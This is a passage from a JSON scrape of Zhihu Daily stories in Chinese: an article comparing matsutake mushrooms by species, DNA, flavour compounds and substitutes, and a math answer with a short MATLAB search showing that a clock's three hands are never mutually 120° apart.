murrillianum（分布在北美西部），土耳其松茸是 Tricholoma anatolicum，而日本松茸是 Tricholoma matsutakea，这几种松茸同属不同种，外形与风味上存在差异很容易理解。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-09dc859ff3fa66a609e94bb6e524c8ae_720w.jpg?source=8673f162\" alt=\"\"></figure><p>日本岩手松茸。via：<a href=\"http://link.zhihu.com/?target=http%3A//mi-journey.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>mi-journey.jp</span><span></span></a></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-84ccf42711b9a4c08a448caf5c9e953d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>北美松茸 。via：<a href=\"http://link.zhihu.com/?target=http%3A//mi-journey.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>mi-journey.jp</span><span></span></a></p>\n<p><strong>中国松茸、韩国松茸、朝鲜松茸、不丹松茸与日本松茸是同一个物种</strong>，所以外观上的相似度更高。但细看 DNA 的话，他们之间还是会有相似度高低之别。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fa92d8df55d6f1d0e57ff37c1b1e0000_720w.jpg?source=8673f162\" alt=\"\"></figure><p>中国松茸。via：<a href=\"http://link.zhihu.com/?target=http%3A//mg9rd7ls.seesaa.net\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>mg9rd7ls.seesaa.net</span><span></span></a></p>\n<figure><img src=\"https://pica.zhimg.com/v2-6c7e67e8214ff6562dbb9d535818a1ca_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不丹松茸。via：<a href=\"http://link.zhihu.com/?target=http%3A//mi-journey.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>mi-journey.jp</span><span></span></a></p>\n<p>2008 年，日本的独立行政法人森林综合研究所等四个机构研究出一个叫 PRIS 法（Polymorphism based on Retroelement Integration Site）的东东，即<strong>以 DNA 来判定亚洲松茸的产地</strong>（注释 1）。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-279eca48cb421480047a7f3bce207a87_720w.jpg?source=8673f162\" alt=\"\"></figure><p>亚洲各产地松茸 DNA 比较。via：<a href=\"http://link.zhihu.com/?target=http%3A//ffpri.affrc.go.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>ffpri.affrc.go.jp</span><span></span></a></p>\n<p>经过对各产地共 95 个松茸（似乎是一次昂贵的试验，很好奇试验剩下的松茸怎么处理了，吞口水 ing~）样品的 DNA 检验，研究人员认为，亚洲松茸按 DNA 分为包括日本松茸、朝鲜半岛松茸（北朝鲜和韩国）、中国东北松茸（黑龙江和吉林）在内的<strong>A 种</strong>，以及包括中国西南松茸（云南和四川）和不丹松茸在内的<strong>B 种</strong>。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9b20653afb26b267d55903ec70592af8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>亚洲松茸 A 种和 B 种的分布。via: <a href=\"http://link.zhihu.com/?target=http%3A//ffpri.affrc.go.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>ffpri.affrc.go.jp</span><span></span></a></p>\n<p>在各种亚洲松茸之中，<strong>A 种和 B 种的 DNA 差异性较大</strong>。在 A 种之中，日本产松茸和中国东北松茸差异性中等；<strong>日本松茸和朝鲜半岛松茸的差异性较小</strong>；朝鲜半岛松茸和中国东北松茸的差异性较小。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e4dd3862440a25b387d2c79b8d694f97_720w.jpg?source=8673f162\" alt=\"\"></figure><p>亚洲各地松茸的差异度。via：<a href=\"http://link.zhihu.com/?target=http%3A//ffpri.affrc.go.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>ffpri.affrc.go.jp</span><span></span></a></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0c7829562a409892a540368f56bb448a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>吉林松茸【左】与云南松茸【右】。via：<a href=\"http://link.zhihu.com/?target=http%3A//hoodo.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>hoodo.jp</span><span></span></a></p>\n<p>即使 DNA 差异较小，不同国家的松茸风味物质组成也可能存在可见的差别。在对日本松茸和韩国松茸风味物质的一项研究中（注释 2），研究人员析出了 3 公斤日本松茸和 6 公斤韩国松茸（似乎又是一次昂贵的试验，很好奇试验剩下的松茸怎么处理了，继续吞口水 ing）中的主要风味物质。</p>\n<p>虽然两国松茸中的<strong>主要风味物质均为松茸醇与肉桂酸甲酯，但二者占比存在一定的差异</strong>，日本产松茸松茸醇占 73.3%，肉桂酸甲酯占 8.3%，而韩国产松茸的松茸醇占 77.9%，肉桂酸甲酯占 4.6%。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-775b92203a1ac90d48dbf53e8cb932a0_720w.jpg?source=8673f162\" alt=\"\"></figure><p>韩国松茸。via：<a href=\"http://link.zhihu.com/?target=http%3A//magazine.hitosara.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>magazine.hitosara.com</span><span></span></a></p>\n<p>此外，<strong>各国、各地松茸的共生树木也不尽相同</strong>。日本松茸的主要共生树种是赤松，但也有共生在本州的黑松、日本南方铁杉、日本北方铁杉和北海道的偃松、萨哈林冷杉、鱼鳞云杉等树木下的。</p>\n<p>朝鲜半岛和中国东北松茸的主要共生树种与日本有类似之处，有赤松，同时还包括红松、黑松等。中国西南松茸的主要共生树种则包括云南松、高松、马尾松、油松等松科针叶林中，以及一些针阔混交林中。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-e79fb40bd9807dab1ed988c43ec477e9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>赤松（左）和黑松（右）。via：<a href=\"http://link.zhihu.com/?target=http%3A//forest-akita.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>forest-akita.jp</span><span></span></a></p>\n<p>另外，不同产地松茸的差异也可能是由松茸本身以外的原因造成的。<strong>松茸的最佳赏味期是采摘后三日内</strong>，而进口松茸通常比日本松茸在运输过程中需要花费更多时间，随着时间的推移，可能会有部分风味损失。而不同国家、不同产地的松茸加工商和出口商在处理和运输松茸过程中<strong>对温度、湿度等指标的控制能力也会影响最终进入到日本市场的松茸品质</strong>。</p>\n<p>上文提到的日本松茸与韩国松茸风味物质的试验还比较了韩国松茸在储存前、低温储存 66 小时后和常温储存 66 小时后风味物质的变化，发现低温储存后的松茸松茸醇含量提升，肉桂酸甲酯含量降低；而常温储存后的松茸松茸醇含量显著降低，肉桂酸甲酯含量提高。可见，储存温度对松茸的风味变化影响显著。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1d8a6fa2b33eedcf2d18371b8ca57f8e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>北朝鲜松茸。via：<a href=\"http://link.zhihu.com/?target=http%3A//globe.asahi.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>globe.asahi.com</span><span></span></a></p>\n<p>所以，日本松茸和外国松茸的差异可能来自<strong>物种差异、细微的 DNA 差异、共生环境造成的差异、运输管理造成的差异</strong>等，最终可能会导致不同产地松茸的风味物质差异。如果食客味蕾犀利，感受到了这微妙的不同，自然值得赞叹。但如果只是出于观念上的偏执或玄学而选择日本松茸，就没有必要了。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-432ebcdb9763252ac77574acca1f4f6c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>松茸和牛寿喜烧，啦啦啦啦~~ via：<a href=\"http://link.zhihu.com/?target=http%3A//umai-mon.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>umai-mon.com</span><span></span></a></p>\n<p>4、<strong>没钱吃松茸怎么办？</strong></p>\n<p>那么，<strong>松茸的风味到底是不是独一无二的？</strong>如果没钱吃松茸，是否可以用其他菌类替代一下呢？像《哆啦 A 梦》里的小伙伴们那样用香菇来伪装松茸，到底可行不？</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1f3efc89f7eeb7201f390333c4743e42_720w.jpg?source=8673f162\" alt=\"\"></figure><p>用仿造喷雾可以将其他东西喷成松茸的样子，但味道不会改变。via：《哆啦 A 梦》</p>\n<p>松茸的主要风味成分是松茸醇（1- 辛烯 -3- 醇）和肉桂酸甲酯。<strong>松茸醇</strong>呈现出略带金属味的蘑菇风味，虽然以“松茸”为名，但松茸醇<strong>并不是松茸独有的风味成分</strong>，香菇、口蘑、灰树花（舞茸）等<strong>许多菌类</strong>，以及<strong>加热后的大豆</strong>（包括毛豆）、<strong>啤酒</strong>等食物中也含有松茸醇。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-8ff0357e4896076d5f25f557a9c4639c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>一些日本常见菌菇，下部中间为松茸。via：<a href=\"http://link.zhihu.com/?target=http%3A//earthresources.sakura.ne.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>earthresources.sakura.ne.jp</span><span></span></a></p>\n<p>加热后的大豆……等一下！<a href=\"https://zhuanlan.zhihu.com/p/20189776\">味噌</a>、<a href=\"https://zhuanlan.zhihu.com/p/20226886\">酱油</a>等日本人每日不离口的调味料制作流程的第一步不正是加热大豆吗？日本常见的小菜煮毛豆的原料毛豆不就是未成熟的大豆？</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-383cc4d366c89da193bd0b3f372f1554_720w.jpg?source=8673f162\" alt=\"\"></figure><p>毛豆配啤酒~ via：<a href=\"http://link.zhihu.com/?target=http%3A//kadoyasan.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>kadoyasan.com</span><span></span></a></p>\n<p>于是，有些日本饮食文化砖家会说，日本人<strong>热爱松茸和热爱味噌、酱油一样，是深深植根于日本味觉 DNA 之中</strong>的，日本人对此类味道就是欲罢不能呀。其实，我国也有食用酱油、豆酱、豆豉等的悠久传统，但在古代并未形成崇尚松茸的饮食文化，可能与松茸产地远离政治、经济、文化中心有关吧。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9ae258dc5210b09b822b49ab56471db6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>酱油与味噌。via：<a href=\"http://link.zhihu.com/?target=http%3A//peoplechina.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>peoplechina.com</span><span></span></a></p>\n<p>松茸的另一种重要风味成分是<strong>肉桂酸甲酯，带有类似山椒、紫苏、罗勒的植物清香</strong>，这是其他常见菌菇不具有的化学成分。当松茸醇与肉桂酸甲酯等香气互相融合，就产生了松茸独特的清爽中带有树脂香气的风味。</p>\n<p>知道了松茸的主要风味物质是松茸醇与肉桂酸甲酯后，日本人便制造出价格便宜的合成香料<strong>“松茸精”</strong>，虽然松茸精的主要成分是酒精，且不如真松茸那么复杂曼妙，但毕竟聊胜于无。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-7ff457652c4e2f22e5cd3b5fc4ea0c5f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>松茸精。via：<a href=\"http://link.zhihu.com/?target=http%3A//rakuten.co.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>rakuten.co.jp</span><span></span></a></p>\n<p>如果像哆啦 A 梦那样，把香菇伪装成松茸的话，到底可不可行呢？<strong>鲜香菇虽然主要呈现松茸醇带来的蘑菇味</strong>，但不含有肉桂酸甲酯，干香菇香菇的代表性香气物质是香菇素（1,2,3,5,6- 五硫杂环庚烷），霸气的风味非常有识别度。用鲜香菇伪装成松茸，虽然不够完美，但面对小夫母子这样附庸风雅的食客，还是可能蒙混过关的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6b88cd25a2661fea1e75a11b5a48f210_720w.jpg?source=8673f162\" alt=\"\"></figure><p>小夫妈妈吃了难吃的假松茸依然假装超级满足。via：《哆啦 A 梦》</p>\n<p>另一个冒充松茸的热门人选是杏鲍菇，外观、食感均有七分相似，于是日本也有用杏鲍菇做成“松茸风”的料理。<strong>杏鲍菇的代表性香气物质是苯甲醛，带有杏仁、坚果、樱桃的风味</strong>（嗯，不知你是否曾经感受到过……），和松茸的风味显然也有差异，如果单独食用，可能会穿帮，如果加上其他调味料，做成炊饭之类的，也很有迷惑性。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-e972b3ab10717c27cdb3830dec876679_720w.jpg?source=8673f162\" alt=\"\"></figure><p>看着松茸的图片，吃着杏鲍菇，感受会不会好一点呢？via：<a href=\"http://link.zhihu.com/?target=http%3A//rocketnews24.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>rocketnews24.com</span><span></span></a></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4ca9e7c983f32e253d4144ed6b5f299e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>松茸风杏鲍菇饭。via：DELISH KITCHEN</p>\n<p>国内经常提到的<strong>姬松茸</strong>（Agaricus subrufescens），也被称为巴西蘑菇，来自伞菌目伞菌科伞菌属，和松茸并不是近亲。姬松茸外形与松茸有几分相似，但带有杏仁风味，与松茸味道有所区别。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b517f496c4a9367e671813929a78f452_720w.jpg?source=8673f162\" alt=\"\"></figure><p>一大波欣欣向荣的姬松茸。via：agaricus.club</p>\n<p>其实，在日本还有一种更能以假乱真的松茸替补——马鹿松茸。<strong>马鹿松茸</strong>（Tricholoma bakamatsutake）和松茸同科同属，外形与松茸相似，只是略小、略带红色，生活在杂木林中，难得的是马鹿香气与松茸类似。因为上市时间比松茸早，马鹿松茸（和另两种松茸近源种一起）被称为“早松茸”。2018 年，日本实现了马鹿松茸的完全养殖，所以产量可期。</p>\n<p>按理说，马鹿松茸看起来这么像松茸，应该备受人喜爱才对。可是，“马鹿”一词在日语里是傻瓜的意思（<a href=\"http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIzNzExMDcwNQ%3D%3D%26mid%3D2247485081%26idx%3D1%26sn%3D7217c18b59f7ae049a47ba68750a1d58%26chksm%3De8ccd247dfbb5b5134564d18550c1f3061666d8839b29583d8c617d7334aa0b4c977555697c9%26scene%3D21%23wechat_redirect\" target=\"_blank\" rel=\"nofollow noreferrer\">马鹿贝</a>，了解一下~），科学分类法名称里也是直接以“马鹿松茸”的罗马音作为物种名，仿佛告知全世界这个蘑菇有点傻，真是对马鹿松茸赤裸裸滴羞辱啊 ……</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-caba6f1d6806256db53587a14d8a526c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>马鹿松茸。via：<a href=\"http://link.zhihu.com/?target=http%3A//nekonekonoheya.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>nekonekonoheya.com</span><span></span></a></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3e3e19faba89e057778d6abeab5f42d4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>早松茸海鳗乌鱼子意面。via：<a href=\"http://link.zhihu.com/?target=http%3A//r-hiro.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>r-hiro.com</span><span></span></a></p>\n<p>内容来自本人知乎专栏：<a href=\"https://zhuanlan.zhihu.com/p/30130609\">碗丸：来做个文章索引，方便大家寻找喜欢的鱼贝虾蟹~~~</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/28373997\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739051"},{"title":"三根表针，两两互为 120° 是几点？","date":"2021-08-09 23:07:50","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-21e78181e03849916a75eecfdb24c8b3_l.jpg?source=8673f162\"><span>奥贝里斯克，</span><span>Ah~fresh brains~I&amp;#39;m coming~</span>\n<a href=\"https://www.zhihu.com/question/351130108/answer/2045064241\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>不存在一个时刻，使时针、分针、秒针互呈 120°</strong>。证明如下：</p>\n<p>设:</p>\n<p>时针运动方程为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta_%7B1%7D%3D%5Comega_%7B1%7Dt\" alt=\"\"></p>\n<p>分针运动方程为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta_%7B2%7D%3D%5Comega_%7B2%7Dt\" alt=\"\"></p>\n<p>秒针运动方程为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta_%7B3%7D%3D%5Comega_%7B3%7Dt\" alt=\"\"></p>\n<p>其中时间</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=t\" alt=\"\"></p>\n<p>以 min 为单位，则有</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Comega_%7B1%7D%3D%5Cfrac%7B360%5E%7B%C2%B0%7D%7D%7B12%5Ctimes60min%7D%3D0.5%5E%7B%C2%B0%7D%2Fmin\" alt=\"\"></p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Comega_%7B2%7D%3D%5Cfrac%7B360%5E%7B%C2%B0%7D%7D%7B60min%7D%3D6%5E%7B%C2%B0%7D%2Fmin\" alt=\"\"></p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Comega_%7B3%7D%3D%5Cfrac%7B360%5E%7B%C2%B0%7D%7D%7B1min%7D%3D360%5E%7B%C2%B0%7D%2Fmin\" alt=\"\"></p>\n<p>假设存在题述情形，即三针在某时刻互呈 120°分布，则存在两类情形：</p>\n<p>(1) 从秒针所在位置顺时针看去，依次为分针、时针；</p>\n<p>(2) 从秒针所在位置顺时针看去，依次为时针、分针。</p>\n<p>有方程组(a)：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta_%7B3%7D%3D%5Ctheta_%7B0%7D%2B%5Comega_%7B3%7Dt\" alt=\"\"></p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta_%7B2%7D%3D%5Ctheta_%7B0%7D%5Cpm+120%5E%7B%C2%B0%7D%2B360%5E%7B%C2%B0%7Dk_%7B1%7D%2B%5Comega_%7B2%7Dt\" alt=\"\"></p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta_%7B1%7D%3D%5Ctheta_%7B0%7D%5Cmp+120%5E%7B%C2%B0%7D%2B360%5E%7B%C2%B0%7Dk_%7B2%7D%2B%5Comega_%7B1%7Dt\" alt=\"\"></p>\n<p>其中，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=k_%7B1%7D%2Ck_%7B2%7D%5Cin+Z\" alt=\"\"></p>\n<p>。</p>\n<p>对情形(1)，方程组(a)第二个方程中 120°前取加号，第三个方程 120°前取减号；</p>\n<p>对情形(2)，方程组(a)第二个方程中 120°前取减号，第三个方程 120°前取加号。</p>\n<p>联立得不定方程(b)：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=t%3D%5Cfrac%7B%5Cpm+240%2B720k%7D%7B11%7D\" alt=\"\"></p>\n<p>其中</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=k%3Dk_%7B2%7D-k_%7B1%7D%5Cin+Z\" alt=\"\"></p>\n<p>由于表盘内容以</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=12h\" alt=\"\"></p>\n<p>(即</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=720min\" alt=\"\"></p>\n<p>)为最小正周期，因此将</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=t\" alt=\"\"></p>\n<p>范围限制为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5B0%2C720min%5D\" alt=\"\"></p>\n<p>解不等式</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=0%5Cleq+%5Cfrac%7B%5Cpm+240%2B720k%7D%7B11%7D%5Cleq+720\" alt=\"\"></p>\n<p>对情形(1)，解得</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=k%3D0%2C1%2C2%2C...%2C10\" alt=\"\"></p>\n<p>对情形(2)，解得</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=k%3D1%2C2%2C3%2C...%2C11\" alt=\"\"></p>\n<p>因此，满足情形(1)对应不定方程的时刻在 12 小时内共出现 11 次，分别为：</p>\n<table><tbody>\n<tr>\n<th>序号(n=k+1)</th>\n<th>时</th>\n<th>分</th>\n<th>秒</th>\n</tr>\n<tr>\n<td>1</td>\n<td>0</td>\n<td>21</td>\n<td>49.[09]</td>\n</tr>\n<tr>\n<td>2</td>\n<td>1</td>\n<td>27</td>\n<td>16.[36]</td>\n</tr>\n<tr>\n<td>3</td>\n<td>2</td>\n<td>32</td>\n<td>43.[63]</td>\n</tr>\n<tr>\n<td>4</td>\n<td>3</td>\n<td>38</td>\n<td>10.[90]</td>\n</tr>\n<tr>\n<td>5</td>\n<td>4</td>\n<td>43</td>\n<td>38.[18]</td>\n</tr>\n<tr>\n<td>6</td>\n<td>5</td>\n<td>49</td>\n<td>5.[45]</td>\n</tr>\n<tr>\n<td>7</td>\n<td>6</td>\n<td>54</td>\n<td>32.[72]</td>\n</tr>\n<tr>\n<td>8</td>\n<td>8</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>9</td>\n<td>9</td>\n<td>5</td>\n<td>27.[27]</td>\n</tr>\n<tr>\n<td>10</td>\n<td>10</td>\n<td>10</td>\n<td>54.[54]</td>\n</tr>\n<tr>\n<td>11</td>\n<td>11</td>\n<td>16</td>\n<td>21.[81]</td>\n</tr>\n</tbody></table>\n<p>（注：此处中括号表示无限循环小数的循环节，下同。）</p>\n<p>满足情形(2)对应不定方程的时刻在 12 小时内共出现 11 次，分别为：</p>\n<table><tbody>\n<tr>\n<th>序号(n=k)</th>\n<th>时</th>\n<th>分</th>\n<th>秒</th>\n</tr>\n<tr>\n<td>1</td>\n<td>0</td>\n<td>43</td>\n<td>38.[18]</td>\n</tr>\n<tr>\n<td>2</td>\n<td>1</td>\n<td>49</td>\n<td>5.[45]</td>\n</tr>\n<tr>\n<td>3</td>\n<td>2</td>\n<td>54</td>\n<td>32.[72]</td>\n</tr>\n<tr>\n<td>4</td>\n<td>4</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>5</td>\n<td>5</td>\n<td>5</td>\n<td>27.[27]</td>\n</tr>\n<tr>\n<td>6</td>\n<td>6</td>\n<td>10</td>\n<td>54.[54]</td>\n</tr>\n<tr>\n<td>7</td>\n<td>7</td>\n<td>16</td>\n<td>21.[81]</td>\n</tr>\n<tr>\n<td>8</td>\n<td>8</td>\n<td>21</td>\n<td>49.[09]</td>\n</tr>\n<tr>\n<td>9</td>\n<td>9</td>\n<td>27</td>\n<td>16.[36]</td>\n</tr>\n<tr>\n<td>10</td>\n<td>10</td>\n<td>32</td>\n<td>43.[63]</td>\n</tr>\n<tr>\n<td>11</td>\n<td>11</td>\n<td>38</td>\n<td>10.[90]</td>\n</tr>\n</tbody></table>\n<p>由于不定方程(b)成立为方程组(a)成立的必要不充分条件，因此上述 22 个解仅满足不定方程(b)，即仅能保证</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=k_%7B2%7D-k_%7B1%7D\" alt=\"\"></p>\n<p>为整数，不一定满足方程组(a)，即保证</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=k_%7B1%7D%2Ck_%7B2%7D\" alt=\"\"></p>\n<p>同时为整数。需要对上述解进行一次验证。</p>\n<p>以情形(1)</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=k%3D0\" alt=\"\"></p>\n<p>时为例，令</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta_%7B0%7D%3D0\" alt=\"\"></p>\n<p>，解得</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=k_%7B1%7D%3Dk_%7B2%7D%3D%5Cfrac%7B697%7D%7B33%7D\" alt=\"\"></p>\n<p>，不满足约束条件，故舍去。</p>\n<p>而事实上此时有：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta_%7B1%7D+mod+360%5E%7B%C2%B0%7D%3D%5Comega_%7B1%7D+t+mod+360%5E%7B%C2%B0%7D%3D10.%5B90%5D%5E%7B%C2%B0%7D\" alt=\"\"></p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta_%7B2%7D+mod+360%5E%7B%C2%B0%7D%3D%5Comega_%7B2%7D+t+mod+360%5E%7B%C2%B0%7D%3D130.%5B90%5D%5E%7B%C2%B0%7D\" alt=\"\"></p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta_%7B3%7D+mod+360%5E%7B%C2%B0%7D%3D%5Comega_%7B3%7D+t+mod+360%5E%7B%C2%B0%7D%3D294.%5B54%5D%5E%7B%C2%B0%7D\" alt=\"\"></p>\n<p>不满足题目要求。</p>\n<p>同理可验证其余 21 个解均不满足要求，方程组(a)无解。</p>\n<p>至此，<strong>完成</strong>了对“不存在一个时刻使时针、分针、秒针互呈 120°”命题的<strong>证明</strong>。以下将采用数值计算方式寻找<strong>最接近</strong>题目要求的<strong>近似解</strong>：</p>\n<p>设时针与分针夹角为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cdelta_%7B1%7D\" alt=\"\"></p>\n<p>，分针与秒针夹角为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cdelta_%7B2%7D\" alt=\"\"></p>\n<p>，时针与秒针夹角为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cdelta_%7B3%7D\" alt=\"\"></p>\n<p>，并将其范围限制于</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5B0%2C180%5E%7B%C2%B0%7D%5D\" alt=\"\"></p>\n<p>区间，定义偏差</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=e%28t%29%3D%5Csum_%7Bi%3D1%7D%5E%7B3%7D%7B%7C%5Cdelta_%7Bi%7D%28t%29-120%5E%7B%C2%B0%7D%7C%7D\" alt=\"\"></p>\n<p>，以</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=1ms\" alt=\"\"></p>\n<p>为步长进行遍历搜寻偏差最小的时刻。</p>\n<div><code><span>clear</span><span>;</span><span>omega_1</span><span>=</span><span>0.5</span><span>;</span><span>omega_2</span><span>=</span><span>6</span><span>;</span><span>omega_3</span><span>=</span><span>360</span><span>;</span><span>t</span><span>=</span><span>1</span><span>/</span><span>60000</span><span>:</span><span>1</span><span>/</span><span>60000</span><span>:</span><span>720</span><span>;</span><span>theta_1</span><span>=</span><span>omega_1</span><span>*</span><span>t</span><span>;</span><span>theta_2</span><span>=</span><span>omega_2</span><span>*</span><span>t</span><span>;</span><span>theta_3</span><span>=</span><span>omega_3</span><span>*</span><span>t</span><span>;</span><span>delta_1</span><span>=</span><span>min</span><span>(</span><span>mod</span><span>(</span><span>abs</span><span>(</span><span>theta_2</span><span>-</span><span>theta_1</span><span>),</span><span>360</span><span>),</span><span>360</span><span>-</span><span>mod</span><span>(</span><span>abs</span><span>(</span><span>theta_2</span><span>-</span><span>theta_1</span><span>),</span><span>360</span><span>));</span><span>delta_2</span><span>=</span><span>min</span><span>(</span><span>mod</span><span>(</span><span>abs</span><span>(</span><span>theta_3</span><span>-</span><span>theta_2</span><span>),</span><span>360</span><span>),</span><span>360</span><span>-</span><span>mod</span><span>(</span><span>abs</span><span>(</span><span>theta_3</span><span>-</span><span>theta_2</span><span>),</span><span>360</span><span>));</span><span>delta_3</span><span>=</span><span>min</span><span>(</span><span>mod</span><span>(</span><span>abs</span><span>(</span><span>theta_3</span><span>-</span><span>theta_1</span><span>),</span><span>360</span><span>),</span><span>360</span><span>-</span><span>mod</span><span>(</span><span>abs</span><span>(</span><span>theta_3</span><span>-</span><span>theta_1</span><span>),</span><span>360</span><span>));</span><span>var</span><span>=</span><span>abs</span><span>(</span><span>delta_1</span><span>-</span><span>120</span><span>)</span><span>+</span><span>abs</span><span>(</span><span>delta_2</span><span>-</span><span>120</span><span>)</span><span>+</span><span>abs</span><span>(</span><span>delta_3</span><span>-</span><span>120</span><span>);</span><span>[</span><span>~</span><span>,</span><span>I</span><span>]=</span><span>min</span><span>(</span><span>var</span><span>);</span><span>T</span><span>=</span><span>t</span><span>(</span><span>I</span><span>);</span><span>h</span><span>=</span><span>floor</span><span>(</span><span>T</span><span>/</span><span>60</span><span>);</span><span>m</span><span>=</span><span>floor</span><span>(</span><span>T</span><span>-</span><span>60</span><span>*</span><span>h</span><span>);</span><span>s</span><span>=</span><span>60</span><span>*</span><span>(</span><span>T</span><span>-</span><span>60</span><span>*</span><span>h</span><span>-</span><span>m</span><span>);</span></code></div>\n<p>基于所定义的偏差，可以得出：在 0~12 时范围内，最接近题目要求的近似解为<strong>2 时 54 分 34 秒 548 毫秒</strong>，此时时针与分针夹角约为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=119.8331%5E%7B%C2%B0%7D\" alt=\"\"></p>\n<p>，分针与秒针夹角约为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=120.1668%5E%7B%C2%B0%7D\" alt=\"\"></p>\n<p>，时针与秒针夹角约为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=120.0001%5E%7B%C2%B0%7D\" alt=\"\"></p>\n<p>。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/351130108\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739029"},{"title":"动画《全职猎人》中有哪些冷知识？","date":"2021-08-09 23:07:45","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>“你在未来看到了什么？”</span>\n<a href=\"https://www.zhihu.com/question/408112656/answer/2044849001\" 